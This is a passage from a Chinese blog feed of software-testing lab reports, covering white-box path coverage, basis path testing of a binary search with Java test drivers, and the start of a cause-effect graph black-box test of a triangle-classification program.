路径覆盖测试是指设计足够多的测试数据，使得程序中的每一条可行路径（即从开始到结束的一条程序流）都至少执行一次。</p><p>   路径有：</p><p>   P1(FF)</p><p>   P2(FT)</p><p>   P3(TF)</p><p>   P4(TT)</p><table><thead><tr><th>用例ID</th><th>X</th><th>Y</th><th>Z</th><th>K</th><th>路径</th></tr></thead><tbody><tr><td>1</td><td>2</td><td>5</td><td>12</td><td>5</td><td>P1</td></tr><tr><td>2</td><td>2</td><td>6</td><td>5</td><td>5</td><td>P2</td></tr><tr><td>3</td><td>5</td><td>2</td><td>5</td><td>5</td><td>P3</td></tr><tr><td>4</td><td>4</td><td>6</td><td>6</td><td>5</td><td>P4</td></tr></tbody></table><p>如上表的测试用例，使得程序中的每一条可行路径都执行了一次。</p><h3 id="实验材料2：N-S-流程图测试"><a href="#实验材料2：N-S-流程图测试" class="headerlink" title="实验材料2：N-S 流程图测试"></a>实验材料2：N-S 流程图测试</h3><p>N-S流程图可用于测算最小测试用例，根据所写的实验代码，绘制N-S图：<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200101115605.png" style="zoom:25%;" /></p><ol><li><p>P1: a是否不等于0  </p></li><li><p>a: 输入的argsA有效  </p></li><li><p>b: 再次输入argsA</p></li><li><p>c: 输入argsB</p></li><li><p>d: 输入argsC</p></li><li><p>e: 计算root1（第一个根）</p></li><li><p>f: 计算root2（第二个根）</p></li></ol><table><thead><tr><th>用例ID</th><th>条件</th><th>路径</th></tr></thead><tbody><tr><td>1</td><td>P1 = True</td><td>acdef</td></tr><tr><td>2</td><td>P1 = False</td><td>bcdef</td></tr></tbody></table><h3 id="实验材料3：基本（独立）路径测试"><a href="#实验材料3：基本（独立）路径测试" class="headerlink" title="实验材料3：基本（独立）路径测试"></a>实验材料3：基本（独立）路径测试</h3><p>基本（独立）路径测试是在程序控制流图的基础上，分析控制构造的环路复杂性，导出独立可执行路径集合，设置测试用例的方法。是路径覆盖测试的一种改进，它把覆盖的路径数压缩到一定限度内，程序中的循环体最多执行一次。  </p><p>独立路径测试步骤是：  </p><ol><li>画出控制流程图（拓扑结构-流图）</li><li>计算流图G的环路复杂性V(G)</li><li>确定只包含独立路径的基本路径集</li><li>设计测试用例</li></ol><p>以下为针对实验材料3到路径路径测试用例设计：  </p><ol><li>画出控制流程图<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200101165400.png" style="zoom:15%;" />  node0: low = 0; high = oderlyTable.length-1;  node1: low <= high  node2: mid = (low + high) / 2  node3: key < orderlyTable[mid]  node4: high = mid - 1  node5: key > orderlyTable[mid]  node6: low = mid + 1  node7: return mid  node8: return -1  </li><li>计算环路复杂性</li></ol><p>V(G) = e - n +1 = 10-9+1 = 2<br>判定节点数为1， 加1，得2，验证正确</p><ol start="3"><li>基本路径集</li></ol><p>path1: 1-8<br>path2: 1-2-3-4-1-2-3-7<br>path3: 1-2-3-5-6-1-2-3-7<br>path4: 1-2-3-7</p><ol start="4"><li>设计测试用例</li></ol><table><thead><tr><th>用例ID</th><th>orderlyTable</th><th>Key</th><th>满足路径</th></tr></thead><tbody><tr><td>1</td><td>[]</td><td>0</td><td>Path1</td></tr><tr><td>2</td><td>[1, 2, 3, 4, 5]</td><td>2</td><td>Path2</td></tr><tr><td>3</td><td>[1, 2, 3, 4, 5]</td><td>4</td><td>Path3</td></tr><tr><td>4</td><td>[1, 2, 3, 4, 5]</td><td>3</td><td>Path4</td></tr></tbody></table><h2 id="测试代码及结果分析"><a href="#测试代码及结果分析" class="headerlink" title="测试代码及结果分析"></a>测试代码及结果分析</h2><h3 id="实验材料1-逻辑覆盖"><a href="#实验材料1-逻辑覆盖" class="headerlink" title="实验材料1: 逻辑覆盖"></a>实验材料1: 逻辑覆盖</h3><ol><li>测试代码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoWorkTesting_fifth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * DoWork的驱动函数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> x</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> y</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> z</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> k</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">doWork</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z , <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((x &gt; <span class="number">3</span>) &amp;&amp; (z &lt; <span class="number">10</span>)) &#123;</span><br><span class="line">            k = k * y - <span class="number">1</span>;</span><br><span class="line">            j = Math.sqrt(k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((x == <span class="number">4</span>) || (y &gt; <span class="number">5</span>)) &#123;</span><br><span class="line">            j = x * y + <span class="number">10</span>;</span><br><span class="line">            j = j % <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        DoWorkTesting_fifth doWork = <span class="keyword">new</span> DoWorkTesting_fifth();</span><br><span class="line">        <span class="keyword">double</span> tempJ = <span class="number">0.00f</span>;</span><br><span class="line">        System.out.println(<span class="string">"======语句覆盖======"</span>);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======判定覆盖======"</span>);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">2</span>,<span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======条件覆盖======"</span>);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">4</span>, <span class="number">5</span>,<span class="number">5</span> ,<span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======判定条件覆盖======"</span>);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">"======条件组合覆盖======"</span>);</span><br><span class="line">        System.out.println(<span class="string">"..."</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======路径覆盖======"</span>);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">2</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line">        tempJ = doWork.doWork(<span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(tempJ);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>结果分析<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200101181454.png" style="zoom: 50%;" /></li></ol><p>符合实验预期。</p><h3 id="实验材料2：N-S流程图测试"><a href="#实验材料2：N-S流程图测试" class="headerlink" title="实验材料2：N-S流程图测试"></a>实验材料2：N-S流程图测试</h3><ol><li>测试代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.UnitaryQuadraticEquation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnitaryQuadraticEquationTesting_fifth</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        UnitaryQuadraticEquation equation = <span class="keyword">new</span> UnitaryQuadraticEquation();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======Path 1======"</span>);</span><br><span class="line">        equation.argsA = <span class="number">2</span>;</span><br><span class="line">        equation.argsB = <span class="number">3</span>;</span><br><span class="line">        equation.argsC = <span class="number">1</span>;</span><br><span class="line">        equation.calculateRoot(equation);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======Path 2======"</span>);</span><br><span class="line">        equation.argsA = <span class="number">0</span>;</span><br><span class="line">        equation.argsB = <span class="number">3</span>;</span><br><span class="line">        equation.argsC = <span class="number">1</span>;</span><br><span class="line">        equation.calculateRoot(equation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>实验结果<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200101182154.png" style="zoom:50%;" />  </li></ol><p>符合实验预期。</p><h3 id="实验材料3：独立路径测试"><a href="#实验材料3：独立路径测试" class="headerlink" title="实验材料3：独立路径测试"></a>实验材料3：独立路径测试</h3><ol><li>测试代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.BinarySearch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinarySearchTesting_fifth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BinarySearch binarySearch = <span class="keyword">new</span> procs.BinarySearch();</span><br><span class="line">        <span class="keyword">int</span> key = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======Path 1======"</span>);</span><br><span class="line">        key = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 有序表</span></span><br><span class="line">        <span class="keyword">int</span>[] orderlyTable_path1 = &#123;&#125;;</span><br><span class="line">        <span class="comment">// 调用BinarySearch方法计算关键词下标</span></span><br><span class="line">        <span class="keyword">int</span> index = binarySearch.binarySearch(orderlyTable_path1, key);</span><br><span class="line">        System.out.println(<span class="string">"关键词的下标是（-1表示未找到）："</span> + index);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======Path 2======"</span>);</span><br><span class="line">        key = <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 有序表</span></span><br><span class="line">        <span class="keyword">int</span>[] orderlyTable = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="comment">// 调用BinarySearch方法计算关键词下标</span></span><br><span class="line">        index = binarySearch.binarySearch(orderlyTable, key);</span><br><span class="line">        System.out.println(<span class="string">"关键词的下标是（-1表示未找到）："</span> + index);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======Path 3======"</span>);</span><br><span class="line">        key = <span class="number">4</span>;</span><br><span class="line">        <span class="comment">// 有序表, Path2中已定义</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用BinarySearch方法计算关键词下标</span></span><br><span class="line">        index = binarySearch.binarySearch(orderlyTable, key);</span><br><span class="line">        System.out.println(<span class="string">"关键词的下标是（-1表示未找到）："</span> + index);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"======Path 4======"</span>);</span><br><span class="line">        key = <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// 有序表, Path2中已定义</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用BinarySearch方法计算关键词下标</span></span><br><span class="line">        index = binarySearch.binarySearch(orderlyTable, key);</span><br><span class="line">        System.out.println(<span class="string">"关键词的下标是（-1表示未找到）："</span> + index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>测试结果</li></ol><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200101183339.png" style="zoom:50%;" />结果符合预期。<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><h3 id="白盒一般的测试的步骤是什么"><a href="#白盒一般的测试的步骤是什么" class="headerlink" title="白盒一般的测试的步骤是什么?"></a>白盒一般的测试的步骤是什么?</h3><ol><li><p>测试计划阶段：根据需求说明书，制定测试进度</p></li><li><p>测试设计阶段：依据程序设计说明书，按照一定规范化的方法进行软件结构划分和设计测试用例</p></li><li><p>测试执行阶段：输入测试用例，得到测试结果</p></li><li><p>测试总结阶段：对比测试的结果和代码的预期结果，分析错误原因，找到并解决错误</p></li></ol><h3 id="白盒测试的测试用例设计有哪些方法"><a href="#白盒测试的测试用例设计有哪些方法" class="headerlink" title="白盒测试的测试用例设计有哪些方法?"></a>白盒测试的测试用例设计有哪些方法?</h3><ol><li><p>逻辑覆盖测试</p></li><li><p>独立路径测试</p></li><li><p>循环测试</p></li><li><p>面对对象的白盒测试</p></li><li><p>域测试</p></li><li><p>符号测试</p></li><li><p>Z路径覆盖</p></li></ol><h3 id="比较白盒、黑盒测试优缺点"><a href="#比较白盒、黑盒测试优缺点" class="headerlink" title="比较白盒、黑盒测试优缺点"></a>比较白盒、黑盒测试优缺点</h3><p>白盒测试的优点：</p><p>对于黑盒测试：</p><ol><li><p>优点<br>1）从产品功能角度测试，可以最大限度的满足用户的需求<br>2）相同的动作可以重复执行，最枯燥的部分可由机器完成<br>3）依据测试用例有针对性地寻找问题，定位更加准确，容易生成测试数据<br>4）可将测试直接和程序/系统要完成的操作相关联</p></li><li><p>缺点<br>1）不能对程序代码进行测试<br>2）如果规格说明设计错误，很难发现<br>3）测试不能充分地进行<br>4）测试结果的准确性取决于测试用例的设计<br>5）自动化测试的复用性较低</p></li></ol><p> 对于白盒测试 :</p><ol><li><p>优点：<br>帮助软件测试人员增大代码的覆盖率。 提供代码的质量，发现代码中隐藏的问题。</p></li><li><p>缺点 ：<br>1) 程序运行会有很多不同的路径，不可能测试所有的运行路径<br>2) 测试基于代码，不能知道设计是否正确，可能会漏掉一些功能需求<br>3) 系统庞大时，测试开销会非常大</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 软件工程 </tag>
            
            <tag> 软件测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件工程】黑盒测试——因果图测试方法</title>
      <link href="/2019/12/31//articles/2019/12/31/1577765280396.html/"/>
      <url>/2019/12/31//articles/2019/12/31/1577765280396.html/</url>
      
        <content type="html"><![CDATA[<h1 id="黑盒测试——因果图测试方法"><a href="#黑盒测试——因果图测试方法" class="headerlink" title="黑盒测试——因果图测试方法"></a>黑盒测试——因果图测试方法</h1><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191229104834.png"><br>图：封面  </p><h2 id="开发语言及实现平台或实验环境"><a href="#开发语言及实现平台或实验环境" class="headerlink" title="开发语言及实现平台或实验环境"></a>开发语言及实现平台或实验环境</h2><p>在 Windows 7 或 Windows 10 操作系统上，使用 C，C++，C#或 Java 语言 及对应的开发环境(IDE)</p><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li>认识黑盒测试方法中因果图测试方法原理  </li><li>掌握黑盒测试方法中因果图测试方法过程</li></ol><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol><li>要求学生能够理解因果图测试方法的相关概念、方法和过程。  </li><li>具体为每一组，每组二——五人，根据实验题目编写出对应的 c 语言或 c++语言程序，组间相互交换程序，按黑盒测试的方法进行测试。  </li></ol><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>对编写的实验内容，采用基于因果图测试方法进行黑盒测试。</p><h2 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h2><ol><li>三角形问题<br>问题描述:三角形问题接受三个整数，a、b 和 c 作为输入，用作三角<br>形的边。程序的输出是由这三条边确定的三角形类型:等边三角形、等腰 三角形、不等边三角形或非三角形。<br>作为输入:三角形的三条边必须满足如下条件: C1:1&lt;=a&lt;=100<br>C2:1&lt;=b&lt;=100<br>C3:1&lt;=c&lt;=100<br>C4:a&lt;b+c C5:b&lt;a+c C6:c&lt;a+b</li></ol><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>预习相关课堂和实验内容，了解测试对象。</li><li>编写实验材料源代码。</li><li>在调试过程中，如果需要，就建立一个或多个桩模块，并建立一个驱动<br>模块。</li><li>设计测试用例。</li><li>测试。</li><li>填写试验报告。</li></ol><h2 id="实验代码"><a href="#实验代码" class="headerlink" title="实验代码"></a>实验代码</h2><h3 id="三角形问题"><a href="#三角形问题" class="headerlink" title="三角形问题"></a>三角形问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> java.util.InputMismatchException;</span><br><span class="line">        <span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleProc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideA = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideB = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> sideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TriangleProc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形边的长度范围</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> side</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyLengthRange</span><span class="params">(<span class="keyword">int</span> side)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((side &gt;= <span class="number">1</span>) &amp;&amp; (side &lt;= <span class="number">100</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长 %1d 不满足大于等于1且小于等于 100"</span>, side));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 函数：验证三角形两边之和大于第三边</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> triangleProc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">verifyFormPrinciple</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((triangleProc.sideA + triangleProc.sideB &lt;= triangleProc.sideC)</span><br><span class="line">                || (triangleProc.sideA + triangleProc.sideC &lt;= triangleProc.sideB)</span><br><span class="line">                || (triangleProc.sideB + triangleProc.sideC &lt;= triangleProc.sideA)) &#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"边长组合为 %1d %2d %3d不满足两边之和大于第三边，是非三角形"</span>,</span><br><span class="line">                    triangleProc.sideA, triangleProc.sideB, triangleProc.sideC));</span><br><span class="line">            System.out.println(<span class="string">"=========请重新输入========="</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"边长组合满足两边之和大于第三边"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">judgeTriangleType</span><span class="params">(TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB || triangleProc.sideA == triangleProc.sideC</span><br><span class="line">                || triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">            <span class="keyword">if</span> (triangleProc.sideA == triangleProc.sideB &amp;&amp; triangleProc.sideB == triangleProc.sideC) &#123;</span><br><span class="line">                String triangleType = <span class="string">"等边三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String triangleType = <span class="string">"等腰三角形"</span>;</span><br><span class="line">                <span class="keyword">return</span> triangleType;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String triangleType = <span class="string">"非等边三角形"</span>;</span><br><span class="line">            <span class="keyword">return</span> triangleType;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inputEdge</span><span class="params">(Scanner scanner, TriangleProc triangleProc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tempSideA = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tempSideC = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println("Welcome to triangle judge program!!!d");</span></span><br><span class="line">        System.out.println(<span class="string">"Please input the side A"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scanner.hasNext()) &#123;</span><br><span class="line">            tempSideA = scanner.nextInt();</span><br><span class="line">            triangleProc.sideA = tempSideA;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge A is %1d. Please input side B"</span>, tempSideA));</span><br><span class="line">            tempSideB = scanner.nextInt();</span><br><span class="line">            triangleProc.sideB = tempSideB;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge B is %1d. Please input side C"</span>, tempSideB));</span><br><span class="line">            tempSideC = scanner.nextInt();</span><br><span class="line">            triangleProc.sideC = tempSideC;</span><br><span class="line">            System.out.println(String.format(<span class="string">"Edge C is %1d. The input is 